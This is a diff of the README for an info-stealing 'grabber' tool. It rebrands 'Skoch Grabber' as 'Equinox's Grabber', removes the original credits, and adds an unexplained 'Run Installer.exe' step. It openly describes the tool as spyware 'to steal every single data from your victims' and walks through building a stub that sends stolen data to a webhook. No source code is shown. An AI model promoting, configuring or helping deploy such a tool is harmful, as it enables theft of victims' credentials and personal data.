@@ -1,10 +1,6 @@
-# SKOCH GRABBER
+# EQUINOX'S GRABBER
 
-[✅] Skoch Grabber is a powerful spyware to steal every single data from your victims.
-
-[⚠️] This code uses Blank Grabber as the template. It's now been discontinued. Check out [here](https://github.com/blank-c/blank-grabber)
-
-[⚠️] This program is free to use. If you've purchased it from somewhere, then you got scammed.
+[✅] EQUI Grabber is a powerful spyware to steal every single data from your victims.
 
 # FEATURES
 ```
@@ -49,14 +45,10 @@
 - Extract the .zip file.
 - Install the latest Python. ~ https://python.org/downloads
 - Make sure to tick that "Add to PATH" option.
+- Run `Installer.exe`
 - Run `Builder.bat`
 - Voila! Put your webhook, tick the features you want, use icon if you want and then build!
 - Your stub folder will show up as soon as it's done.
 
 # SUPPORT
-https://dsc.gg/skochworld
-
-# CREDITS
-[⚠️] All of the rights go to [Blank-c](https://github.com/blank-c).
-
-[⚠️] Scripts such as SkochOBF and some implements in the main code belongs to me. You're free to use it but not to remove the credits.
+ADD ME ON DISCORD : distur.bed
